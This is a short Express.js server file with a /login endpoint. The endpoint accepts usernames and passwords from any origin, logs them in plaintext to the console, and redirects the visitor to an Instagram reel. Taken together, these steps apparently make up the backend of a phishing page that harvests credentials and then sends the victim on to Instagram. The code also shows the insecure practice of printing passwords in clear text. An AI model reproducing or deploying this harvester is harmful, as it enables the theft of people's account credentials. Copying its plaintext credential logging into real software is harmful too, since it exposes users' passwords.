const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 3000; // You can change the port if needed

// Enable CORS for all routes
app.use(cors());

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Handle POST request to '/login' endpoint
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Simulate database storage (replace with actual database operations)
    // For demonstration, we just log the received data
    console.log(`Received login credentials: ${username}, ${password}`);

    // Redirect user to another webpage after successful login
    res.redirect('https://www.instagram.com/reel/C4TCwGfv1WO/?utm_source=ig_web_copy_link'); // Replace with your desired URL
});

// Start the server
app.listen(port, '0.0.0.0', () => {
    console.log(`Server is running on http://localhost:${port}`);
});